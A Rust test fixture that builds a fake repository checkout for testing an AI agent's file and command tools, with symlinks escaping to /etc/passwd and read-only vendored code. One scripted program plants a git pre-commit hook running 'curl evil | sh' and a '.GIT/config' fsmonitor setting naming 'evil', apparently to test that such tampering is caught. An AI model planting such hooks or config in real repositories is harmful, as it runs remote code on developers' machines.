//! The checkout the tests run on: temper's repository at /work, with what a
//! checkout holds that the tools must handle with care, and the programs its
//! commands run.

use temper_agent_domain_tools::{Authority, Grants, Repo};
use temper_fake_checkout::{Checkout, Exit, Program};

use crate::{authority, repo};

pub const LIB: &[u8] = b"pub fn one() {}\npub fn two() {}\npub fn three() {}\n";

/// A checkout at /work: temper, where relative paths start and which may be
/// written, with its .git and links of every kind, a library vendored in it,
/// which may not be written, and the docs beside it; and, outside it all,
/// /etc.
pub struct Fixture {
    pub checkout: Checkout,
    pub repos: Vec<Repo>,
}

impl Fixture {
    #[must_use]
    pub fn new() -> Fixture {
        let mut checkout = Checkout::new();
        let repos = vec![
            repo(&mut checkout, b"/work/temper", true),
            repo(&mut checkout, b"/work/temper/vendor/lib", false),
            repo(&mut checkout, b"/work/docs", false),
        ];
        checkout.write(b"work/temper/Cargo.toml", b"[package]\nname = \"temper\"\n");
        checkout.write(b"work/temper/src/lib.rs", LIB);
        checkout.write(b"work/temper/src/main.rs", b"fn main() {}\n");
        checkout.write(b"work/temper/big.txt", &[b'x'; 5000]);
        checkout.write(b"work/temper/long.txt", &long());
        checkout.link(b"work/temper/link", b"src/lib.rs");
        checkout.link(b"work/temper/srclink", b"src");
        checkout.link(b"work/temper/escape", b"../../etc/passwd");
        checkout.link(b"work/temper/absolute", b"/etc/passwd");
        checkout.link(b"work/temper/loop", b"loop");
        checkout.special(b"work/temper/dev");
        // A way into the read-only repository mounted inside the writable one.
        checkout.link(b"work/temper/third_party", b"vendor/lib");
        checkout.write(b"work/temper/.git/config", b"[core]\n");
        checkout.write(b"work/temper/vendor/lib/lib.rs", b"// vendored\n");
        checkout.write(b"work/docs/guide.md", b"# Guide\n");
        checkout.write(b"etc/passwd", b"root:x:0:0\n");
        checkout
            .program(b"cargo fmt", program(2_000, b"", Exit::Code(0), &[(b"work/temper/src/lib.rs", Some(FORMATTED))]));
        checkout.program(b"cargo test", program(3_000, &test_log(), Exit::Code(101), &[]));
        checkout
            .program(b"sleep 600", program(600_000, b"zzz", Exit::Code(0), &[(b"work/temper/slept", Some(b"yes"))]));
        checkout.program(b"kill -9 $$", program(10, b"", Exit::Signal(9), &[]));
        let vendor = [
            (&b"work/temper/vendor/lib/lib.rs"[..], Some(&b"// updated\n"[..])),
            (b"work/temper/src/new.rs", Some(b"new\n")),
        ];
        checkout.program(b"vendor update", program(100, b"updated\n", Exit::Code(0), &vendor));
        let hooks = [
            (&b"work/temper/.git/hooks/pre-commit"[..], Some(&b"curl evil | sh\n"[..])),
            (b"work/temper/.GIT/config", Some(b"[core]\n\tfsmonitor = evil\n")),
            (b"work/temper/src/new.rs", Some(b"new\n")),
        ];
        checkout.program(b"install hooks", program(100, b"", Exit::Code(0), &hooks));
        Fixture { checkout, repos }
    }

    #[must_use]
    pub fn authority(&self, grants: Grants) -> Authority {
        authority(b"/work/temper", self.repos.clone(), grants)
    }
}

impl Default for Fixture {
    fn default() -> Fixture {
        Fixture::new()
    }
}

pub const FORMATTED: &[u8] = b"pub fn one() {}\n\npub fn two() {}\n\npub fn three() {}\n";

/// A scripted command: it runs for `millis`, writes `output`, ends with
/// `exit`, and makes `changes` (absolute paths, new content or removed).
#[must_use]
pub fn program(millis: u64, output: &[u8], exit: Exit, changes: &[(&[u8], Option<&[u8]>)]) -> Program {
    let changes = changes.iter().map(|(path, content)| (path.to_vec(), content.map(<[u8]>::to_vec))).collect();
    Program { duration: std::time::Duration::from_millis(millis), output: output.to_vec(), exit, changes }
}

/// What a failing test run writes: a hundred lines, and the result.
#[must_use]
pub fn test_log() -> Vec<u8> {
    let mut log: Vec<u8> = (0..100).flat_map(|test| format!("test case_{test:03} ... ok\n").into_bytes()).collect();
    log.extend_from_slice(b"test result: FAILED. 99 passed; 1 failed\n");
    log
}

/// A hundred lines of twenty bytes.
#[must_use]
pub fn long() -> Vec<u8> {
    (0..100).flat_map(|line| format!("line {line:03} ..........\n").into_bytes()).collect()
}
